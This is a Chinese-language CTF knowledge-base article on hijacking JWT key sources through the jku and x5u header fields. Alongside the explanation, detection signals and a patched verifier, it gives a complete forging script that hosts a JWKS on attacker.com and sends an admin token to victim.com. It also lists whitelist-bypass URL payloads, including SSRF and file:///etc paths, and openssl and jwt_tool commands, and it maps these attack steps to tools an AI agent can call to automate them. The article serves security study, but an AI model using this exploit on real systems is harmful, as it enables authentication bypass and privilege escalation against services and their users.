---
id: "ctf-website/02-auth/jwt/05-jku-x5u-abuse"
title: "JWT `jku` / `x5u` 密钥源劫持"
title_en: "JWT jku / x5u Key Source Hijacking"
summary: >
  介绍利用 JWT Header 中 jku 和 x5u 字段劫持密钥来源的攻击方法。攻击者生成自己的密钥对，将 jku/x5u 指向自己控制的 JWKS 或证书服务器，用对应私钥签名即可通过服务端验证。涵盖 URL 白名单绕过、开放重定向利用及 SSRF 链。
summary_en: >
  Exploiting JWT Header jku and x5u fields to hijack key sources. Attackers generate their own keypair, point jku/x5u to a controlled JWKS or certificate server, and sign with the corresponding private key to pass verification. Covers URL whitelist bypass, open redirect exploitation, and SSRF chaining.
board: "ctf-website"
category: "02-auth"
signals: ["jku", "x5u", "JWK Set URL", "X.509", "密钥劫持", "RSA", "JWKS", "jwt_tool"]
mcp_tools: ["run_ctf_tool", "http_probe"]
keywords: ["jku劫持", "x5u攻击", "JWKS", "JWT密钥劫持", "jwt_tool", "jku injection", "RSA密钥对", "JWK Set"]
difficulty: "advanced"
tags: ["authentication", "jwt", "key-hijacking", "web-security", "ssrf", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# JWT `jku` / `x5u` 密钥源劫持

## 输入信号

- Header 中存在 `jku`, `x5u`, `jwk`, `x5c`，或错误信息提到 JWKS/certificate fetch
- 修改 URL 后目标服务有明显延迟，或可控服务器收到请求
- OpenID 配置暴露 `jwks_uri`，但服务端仍读取 token header 中的 URL
- URL 白名单只做字符串包含、后缀、前缀或 parser 不一致

## 0. URL 绕过矩阵

| 场景 | Payload 形态 | 命中样本 | 失败样本 |
|------|--------------|----------|----------|
| 后缀检查 | `https://trusted.com.evil.test/jwks.json` | 访问 evil | host 精确匹配 |
| userinfo 混淆 | `https://trusted.com@evil.test/jwks.json` | 访问 evil | parser 取 hostname |
| fragment 混淆 | `https://evil.test/#trusted.com/jwks.json` | 白名单过、请求 evil | fragment 被丢弃后校验 |
| open redirect | `https://trusted.com/redirect?u=https://evil/jwks` | 跟随跳转 | 不跟随 30x |
| DNS rebinding | `https://allowed.test/jwks` | 首次外网、二次内网 | 固定解析结果 |
| scheme 降级 | `http://trusted.com/jwks` | 明文抓取 | 强制 https |

## 0.1 JWKS 命中判定

| 证据 | 含义 |
|------|------|
| access.log 出现目标 IP | 服务端确实取了 header URL |
| `kid` 命中攻击者 JWKS | key 选择可控 |
| 伪造 token 进入业务接口 | 密钥源劫持成立 |
| 只请求但 token 仍失败 | key 格式、kid、alg 或 claim 卡住 |

## 原理

`jku`（JWK Set URL）和 `x5u`（X.509 URL）告诉验证方去哪找公钥。如果服务端**不检查 URL 是否可信**，攻击者指定自己服务器上的 JWKS，用对应的私钥签名，验证方取回攻击者的公钥后自然验证通过。

```
┌──────────────────────────────────────────────────────────────┐
│ 正常流程                                                      │
│                                                               │
│   Client ──[jku: https://trusted.com/jwks.json]──▶ Server    │
│   (用 trusted.com 的私钥签名)         │                        │
│                                       GET jwks.json           │
│                                       ◀─── PK_trusted ─────  │
│                                       verify(PK_trusted)     │
│                                       ✓                       │
├──────────────────────────────────────────────────────────────┤
│ 攻击流程                                                      │
│                                                               │
│   Attacker ──[jku: https://evil.com/jwks.json]──▶ Server     │
│   (用 evil.com 的私钥签名)              │                      │
│                                          GET jwks.json        │
│                                          ◀─── PK_evil ────── │
│                                          verify(PK_evil)     │
│                                          ✓ → 绕过!            │
└──────────────────────────────────────────────────────────────┘
```

---

## 伪代码：漏洞逻辑

```python
# 漏洞代码 — 未验证 jku 来源
def verify_token(token):
    header = jwt_decode_header(token)

    if header.get('jku'):
        # BUG: 直接信任 header 中的 jku URL
        jwks = requests.get(header['jku']).json()
        key = jwk_to_pem(jwks['keys'][0])
    elif header.get('x5u'):
        cert = requests.get(header['x5u']).content
        key = x509_to_pem(cert)
    elif header.get('kid'):
        key = get_key_from_db(header['kid'])
    else:
        key = default_public_key

    return jwt_verify(token, key)  # 用攻击者提供的公钥验证
```

```python
# 正确代码 — 白名单 + URL 验证
TRUSTED_JKU_HOSTS = ['trusted.auth.com', 'auth.internal']

def verify_token(token):
    header = jwt_decode_header(token)
    if header.get('jku'):
        url = urlparse(header['jku'])
        if url.hostname not in TRUSTED_JKU_HOSTS:
            raise InvalidJWKSError(f"Untrusted jku host: {url.hostname}")
        if url.scheme != 'https':
            raise InvalidJWKSError("jku must use HTTPS")
    # ... 继续验证
```

---

## 伪代码：攻击脚本

```python
# attack_jku_hijack.py
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import json, base64, requests

# ─── 步骤 1: 生成攻击者自己的 RSA 密钥对 ───
def generate_attacker_keypair():
    private = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public = private.public_key()
    return private, public

# ─── 步骤 2: 将公钥转为 JWK 格式 ───
def public_key_to_jwk(public_key) -> dict:
    """
    RSA 公钥 → JWK 格式
    """
    numbers = public_key.public_numbers()
    n_b64 = base64.urlsafe_b64encode(
        numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, 'big')
    ).rstrip(b'=').decode()
    e_b64 = base64.urlsafe_b64encode(
        numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, 'big')
    ).rstrip(b'=').decode()

    return {
        "kty": "RSA",
        "use": "sig",
        "kid": "attacker-key-1",
        "n": n_b64,
        "e": e_b64,
        "alg": "RS256"
    }

# ─── 步骤 3: 托管 JWKS ───
def host_jwks(jwk: dict) -> str:
    """
    将 JWKS 托管到攻击者可控的服务器
    返回可访问的 URL
    """
    jwks = {"keys": [jwk]}
    jwks_json = json.dumps(jwks)

    # 方式 A: 用 ngrok/localtunnel 暴露本地
    # 方式 B: 上传到 GitHub Pages / S3 / Pastebin
    # 方式 C: 用 pipedream.com / webhook.site 捕获请求
    # 方式 D: 自建服务器

    # 假设我们已有一个可控域名
    with open("/var/www/html/jwks.json", "w") as f:
        f.write(jwks_json)
    return "https://attacker.com/jwks.json"

# ─── 步骤 4: 构造恶意 JWT ───
def forge_with_jku(payload: dict, private_key, jku_url: str) -> str:
    """
    用攻击者私钥签名，jku 指向自己的 JWKS
    """
    import jwt as pyjwt
    token = pyjwt.encode(
        payload,
        private_key,
        algorithm="RS256",
        headers={"jku": jku_url, "kid": "attacker-key-1"}
    )
    return token

# ─── 攻击入口 ───
private_key, public_key = generate_attacker_keypair()
jwk = public_key_to_jwk(public_key)
jku_url = host_jwks(jwk)

admin_token = forge_with_jku(
    payload={"sub": "admin", "role": "admin", "exp": 9999999999},
    private_key=private_key,
    jku_url=jku_url
)

resp = requests.get("https://victim.com/api/admin",
    headers={"Authorization": f"Bearer {admin_token}"})
print(f"[+] Status: {resp.status_code}")
```

---

## 绕过 jku URL 白名单

```python
# 常见白名单绕过技术

# 1. 子域名欺骗（如果白名单只检查后缀）
#    白名单: *.trusted.com
#    → jku: https://trusted.com.evil.com/jwks.json

# 2. 开放重定向利用
#    如果 trusted.com 上有开放重定向:
#    → jku: https://trusted.com/redirect?url=https://evil.com/jwks.json

# 3. SSRF 利用
#    如果 trusted.com 有 SSRF:
#    → jku: https://trusted.com/fetch?url=http://internal/jwks

# 4. URL parser 差异
#    → jku: https://trusted.com@evil.com/jwks.json    (userinfo 混淆)
#    → jku: https://trusted.com#@evil.com/jwks.json   (fragment 混淆)
#    → jku: https://evil.com/..trusted.com/jwks.json  (路径混淆)

# 5. 协议降级
#    如果只检查 host 不检查 scheme:
#    → jku: http://evil.com/jwks.json  (可能不要求 TLS)
```

### URL 混淆 Payload 字典

```text
# jku / x5u URL 混淆列表
https://trusted.com.attacker.com/jwks.json
https://trusted.com%40attacker.com/jwks.json
https://attacker.com/trusted.com/jwks.json
https://trusted.com/redirect?url=https://attacker.com/jwks.json
https://trusted.com#@attacker.com/jwks.json
http://localhost:8080/.well-known/jwks.json
file:///etc/ssl/certs/jwt-public.pem
https://webhook.site/<uuid>  # 用于观察是否有请求过来
```

---

## `x5u` 专用攻击

```bash
# x5u 指向 X.509 证书。攻击流程类似 jku，但需要提供证书

# 1. 生成自签名证书
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=attacker"

# 2. 从证书提取公钥用于签名
openssl x509 -in cert.pem -pubkey -noout > pubkey.pem

# 3. 托管 cert.pem 到可控服务器
# 4. 用私钥签名 JWT，x5u 指向 cert.pem URL
```

---

## 检测信号

- Header 包含 `jku` 或 `x5u` 字段
- 修改 `jku`/`x5u` 值后，错误信息变更为证书/密钥相关错误
- 攻击者 Web 服务器收到来自目标 IP 的 JWKS/证书请求 → 确认漏洞
- 服务端响应时间增加（去外部取 JWKS 的网络延迟）

## 工具命令

```bash
# jwt_tool jku 注入
python3 jwt_tool.py <token> -X i -pk attacker_private.pem

# 生成 RSA 密钥对
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 托管 JWKS (临时)
python3 -m http.server 8888
# 然后将 jwks.json 放在当前目录，ngrok http 8888

# 观察是否有请求过来
python3 -m http.server 8888 2>&1 | tee access.log
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| JKU/x5u 滥用攻击 | `run_ctf_tool jwt_tool` | 使用 jwt_tool 修改 JWT jku/x5u 头 |
| 自定义 JWK 端点验证 | `http_probe` | HTTP GET 探测自定义 JWK 端点可达性 |

## 工作流

捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。


## Evidence

- `jwks_access.log`: 目标 IP、User-Agent、请求路径、kid、时间戳。
- `attacker_jwks.json`: 攻击者 JWK、kid、alg、key thumbprint。
- `jku_x5u_matrix.csv`: URL 变体、是否回连、是否跟随跳转、接口响应、body hash。
- 成功样本: 目标抓取攻击者 JWKS/x5u 证书，并接受攻击者私钥签出的高权限 token。
- 失败样本: 无回连、只允许固定 host、回连但 kid 不匹配、key 格式不接受、claim 校验失败。
- 下一跳: URL fetch 只回连不接受时转 URL parser/open redirect/SSRF；签名接受但权限不变转 `06-claim-missing`。
